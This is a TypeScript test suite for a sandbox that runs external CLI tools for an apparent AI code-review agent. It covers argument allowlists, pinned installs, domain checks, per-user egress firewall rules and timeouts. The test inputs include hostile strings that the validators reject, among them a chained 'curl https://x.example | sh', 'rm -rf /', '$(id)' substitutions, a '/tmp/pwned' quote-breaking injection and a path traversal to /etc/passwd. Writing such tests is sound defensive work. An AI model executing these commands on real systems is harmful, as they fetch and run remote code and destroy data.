import { execFileSync } from 'node:child_process';

import type { CliToolConfig } from '@libs/core/infrastructure/config/types/general/codeReview.type';

import {
    buildInstallScript,
    buildNetworkScript,
    buildRunCommand,
    CLI_MAX_TIMEOUT_SEC,
    cliSandboxIdentity,
    isValidDomain,
    matchesAllowedPrefix,
    normalizeCliArgs,
    planCliInstall,
    resolveCliTimeoutSec,
    shellJoin,
    validateCliArgs,
} from './cli-command';

const cli = (overrides: Partial<CliToolConfig> = {}): CliToolConfig => ({
    name: 'lintkit',
    install: 'npm install -g lintkit@2.4.1',
    binary: 'lintkit',
    allowedPrefixes: ['check --format json', 'rules list'],
    usage: 'Run `check --format json <path>`.',
    runsProjectCode: false,
    allowedDomains: ['api.lintkit.example'],
    ...overrides,
});

describe('normalizeCliArgs', () => {
    it('splits a prefix the model sent as one argument', () => {
        expect(
            normalizeCliArgs(['check --format json', 'src/a.ts'], cli()),
        ).toEqual(['check', '--format', 'json', 'src/a.ts']);
    });

    it('leaves an argument that is not a prefix alone, spaces included', () => {
        expect(normalizeCliArgs(['rules', 'my file.ts'], cli())).toEqual([
            'rules',
            'my file.ts',
        ]);
    });
});

describe('matchesAllowedPrefix', () => {
    it('lets a prefix ending in "/" cover any path under it', () => {
        const scoped = cli({ allowedPrefixes: ['scan scripts/'] });
        expect(
            matchesAllowedPrefix(['scan', 'scripts/deploy.sh'], scoped),
        ).toBe(true);
        expect(matchesAllowedPrefix(['scan', 'src/app.ts'], scoped)).toBe(
            false,
        );
        expect(
            matchesAllowedPrefix(['scan', 'scripts/../etc/passwd'], scoped),
        ).toBe(false);
    });

    it('accepts argv that starts with an allowed prefix, token by token', () => {
        expect(
            matchesAllowedPrefix(
                ['check', '--format', 'json', 'src/a.ts'],
                cli(),
            ),
        ).toBe(true);
        expect(matchesAllowedPrefix(['rules', 'list'], cli())).toBe(true);
    });

    it('refuses argv outside every prefix', () => {
        expect(matchesAllowedPrefix(['auth', 'logout'], cli())).toBe(false);
        expect(matchesAllowedPrefix(['check', '--format', 'xml'], cli())).toBe(
            false,
        );
        expect(matchesAllowedPrefix(['check'], cli())).toBe(false);
    });

    it('compares whole tokens, never a string prefix', () => {
        const c = cli({ allowedPrefixes: ['scan'] });
        expect(matchesAllowedPrefix(['scanner'], c)).toBe(false);
        expect(matchesAllowedPrefix(['scan;rm', '-rf', '/'], c)).toBe(false);
        // A joined-string check would accept this; argv tokens do not.
        expect(matchesAllowedPrefix(['scan --all'], c)).toBe(false);
        expect(matchesAllowedPrefix(['scan', '--all'], c)).toBe(true);
    });

    it('ignores the binary when a prefix spells it', () => {
        const c = cli({ allowedPrefixes: ['lintkit check'] });
        expect(matchesAllowedPrefix(['check', 'src'], c)).toBe(true);
        expect(matchesAllowedPrefix(['lintkit', 'check'], c)).toBe(false);
    });

    it('treats an empty or binary-only prefix as allowing nothing', () => {
        expect(
            matchesAllowedPrefix(
                ['anything'],
                cli({ allowedPrefixes: ['  '] }),
            ),
        ).toBe(false);
        expect(
            matchesAllowedPrefix(
                ['anything'],
                cli({ allowedPrefixes: ['lintkit'] }),
            ),
        ).toBe(false);
    });
});

describe('validateCliArgs', () => {
    it('requires a non-empty array of strings without NUL', () => {
        expect(validateCliArgs('check src')).toMatch(/array/);
        expect(validateCliArgs([])).toMatch(/empty/);
        expect(validateCliArgs(['check', 3])).toMatch(/string/);
        expect(validateCliArgs(['a\0b'])).toMatch(/NUL/);
        expect(validateCliArgs(['check', 'src'])).toBeNull();
    });
});

describe('planCliInstall', () => {
    it('refuses an install without a pinned version', () => {
        expect(
            planCliInstall(cli({ install: 'npm install -g lintkit' })),
        ).toEqual(expect.objectContaining({ ok: false }));
        expect(
            planCliInstall(cli({ install: 'pip install lintkit>=2.0.0' })).ok,
        ).toBe(false);
    });

    it('refuses when only one of several packages is pinned', () => {
        const plan = planCliInstall(
            cli({ install: 'npm install -g lintkit@2.4.1 lintkit-extra' }),
        );
        expect(plan).toEqual({
            ok: false,
            reason: expect.stringContaining('lintkit-extra'),
        });
    });

    it('refuses a package spec that only contains a pin somewhere in it', () => {
        for (const install of [
            'npm install -g lintkit@2.4.1x',
            'npm install -g lintkit@2.4.1@latest',
            'npm install -g lintkit@latest-2.4.1',
            'pip install lintkit==2.4.1x',
        ]) {
            expect(planCliInstall(cli({ install })).ok).toBe(false);
        }
    });

    it('refuses shell syntax that would chain a second command', () => {
        for (const install of [
            'npm install -g lintkit@2.4.1; curl https://x.example | sh',
            'npm install -g lintkit@2.4.1 && rm -rf /',
            'npm install -g $(echo lintkit@2.4.1)',
            'npm install -g `id`@2.4.1',
        ]) {
            expect(planCliInstall(cli({ install })).ok).toBe(false);
        }
    });

    it('refuses installers that are not package managers', () => {
        expect(
            planCliInstall(
                cli({ install: 'curl https://x.example/lintkit@1.2.3' }),
            ).ok,
        ).toBe(false);
        expect(
            planCliInstall(cli({ install: 'npm run lintkit@1.2.3' })).ok,
        ).toBe(false);
    });

    it('accepts pinned installs across supported package managers', () => {
        for (const install of [
            'npm install -g lintkit@2.4.1',
            'pnpm add -g lintkit@2.4.1',
            'pip install lintkit==2.4.1',
            'pipx install lintkit==2.4.1',
            'uv tool install lintkit==2.4.1',
            'go install example.com/lintkit/cmd/lintkit@v2.4.1',
            'cargo install lintkit@2.4.1 --locked',
        ]) {
            expect(planCliInstall(cli({ install }))).toEqual(
                expect.objectContaining({ ok: true }),
            );
        }
    });

    it('refuses flags that could fetch something other than the pin', () => {
        for (const install of [
            'pip install lintkit==2.4.1 --index-url=https://mirror.example/simple',
            'npm install -g lintkit@2.4.1 --registry=https://mirror.example',
            'pip install -e lintkit==2.4.1',
            'pip install git+https://code.example/lintkit@v2.4.1',
            'npm install -g https://code.example/lintkit-2.4.1.tgz#lintkit@2.4.1',
            'pip install ./lintkit==2.4.1',
        ]) {
            expect(planCliInstall(cli({ install })).ok).toBe(false);
        }
    });

    it('installs without lifecycle scripts when the CLI runs project code', () => {
        const npm = planCliInstall(cli({ runsProjectCode: true }));
        expect(npm.ok && npm.argv).toContain('--ignore-scripts');
        const pip = planCliInstall(
            cli({
                runsProjectCode: true,
                install: 'pip install lintkit==2.4.1',
            }),
        );
        expect(pip.ok && pip.argv).toContain('--only-binary=:all:');
        const plain = planCliInstall(cli());
        expect(plain.ok && plain.argv).not.toContain('--ignore-scripts');
    });
});

describe('isValidDomain', () => {
    it('accepts plain host names only', () => {
        expect(isValidDomain('api.lintkit.example')).toBe(true);
        expect(isValidDomain('*.lintkit.example')).toBe(false);
        expect(isValidDomain('https://api.lintkit.example')).toBe(false);
        expect(isValidDomain('api.lintkit.example:443')).toBe(false);
        expect(isValidDomain('api.lintkit.example; id')).toBe(false);
        expect(isValidDomain('10.0.0.1')).toBe(false);
    });
});

describe('cliSandboxIdentity', () => {
    it('gives each agent and CLI pair its own user and chain', () => {
        const a = cliSandboxIdentity('agent-1', 'lintkit');
        const b = cliSandboxIdentity('agent-2', 'lintkit');
        expect(a.user).not.toBe(b.user);
        expect(a.user).toMatch(/^kcli[a-f0-9]{12}$/);
        expect(a.chain.length).toBeLessThanOrEqual(28);
        expect(cliSandboxIdentity('agent-1', 'lintkit')).toEqual(a);
    });
});

describe('buildRunCommand', () => {
    const identity = cliSandboxIdentity('agent-1', 'lintkit');

    it('passes argv through without any shell interpretation', () => {
        const hostile = [
            'check',
            '--format',
            'json',
            "x'; touch /tmp/pwned; echo '",
            '$(id)',
            '`id`',
            'a|b',
            '*',
        ];
        const argv = JSON.parse(
            execFileSync(
                '/bin/sh',
                [
                    '-c',
                    `node -e 'console.log(JSON.stringify(process.argv.slice(1)))' ${shellJoin(hostile)}`,
                ],
                { encoding: 'utf8' },
            ),
        );
        expect(argv).toEqual(hostile);

        const command = buildRunCommand({
            identity,
            binaryPath: `${identity.home}/.local/bin/lintkit`,
            args: hostile,
            secretEnvNames: [],
            timeoutSec: 120,
        });
        // The call is one quoting deep in the root shell it runs in.
        expect(command).toContain(shellJoin(hostile));
        expect(command).toContain(`-u '${identity.user}'`);
        expect(command).toContain('/usr/bin/timeout -k 5 120');
        expect(command).not.toContain('--preserve-env');
    });

    it('names secret variables for the process env and never carries values', () => {
        const command = buildRunCommand({
            identity,
            binaryPath: `${identity.home}/.local/bin/lintkit`,
            args: ['check'],
            secretEnvNames: ['LINTKIT_TOKEN'],
            timeoutSec: 30,
        });
        expect(command).toContain('--preserve-env=LINTKIT_TOKEN');
    });
});

describe('scripts', () => {
    const identity = cliSandboxIdentity('agent-1', 'lintkit');

    it('installs as the CLI user, with a clean env and a timeout', () => {
        const script = buildInstallScript({
            identity,
            argv: ['npm', 'install', '-g', 'lintkit@2.4.1'],
            binary: 'lintkit',
        });
        expect(script).toContain(`sudo -n -u '${identity.user}'`);
        expect(script).toContain(`/usr/bin/env -C '${identity.home}' -i`);
        expect(script).toContain("'npm' 'install' '-g' 'lintkit@2.4.1'");
        expect(script).toContain('--shell /usr/sbin/nologin');
        expect(script).not.toMatch(/\/usr\/(local\/)?bin'?\s*;/);
    });

    it('fences egress by user with the original destination and pins hosts', () => {
        const script = buildNetworkScript({
            identity,
            domains: ['api.lintkit.example'],
        });
        expect(script).toContain('ct original ip daddr');
        expect(script).toContain('meta skuid');
        expect(script).toContain(
            `add rule inet kodus_cli ${identity.chain} reject`,
        );
        expect(script).toContain("getent ahostsv4 'api.lintkit.example'");
        expect(script).toContain(`# ${identity.tag}`);
    });

    it('with no allowed domain, rejects every destination', () => {
        const script = buildNetworkScript({ identity, domains: [] });
        expect(script).not.toContain('getent');
        expect(script).toContain(
            `add rule inet kodus_cli ${identity.chain} reject`,
        );
    });
});

describe('resolveCliTimeoutSec', () => {
    it('defaults to 120s and caps the configured value', () => {
        expect(resolveCliTimeoutSec({})).toBe(120);
        expect(resolveCliTimeoutSec({ timeoutSec: 30 })).toBe(30);
        expect(resolveCliTimeoutSec({ timeoutSec: 99_999 })).toBe(
            CLI_MAX_TIMEOUT_SEC,
        );
    });

    it('falls back to the default when the configured value is not a number', () => {
        expect(resolveCliTimeoutSec({ timeoutSec: NaN })).toBe(120);
        expect(resolveCliTimeoutSec({ timeoutSec: Infinity })).toBe(120);
        expect(resolveCliTimeoutSec({ timeoutSec: '30' as any })).toBe(120);
    });
});
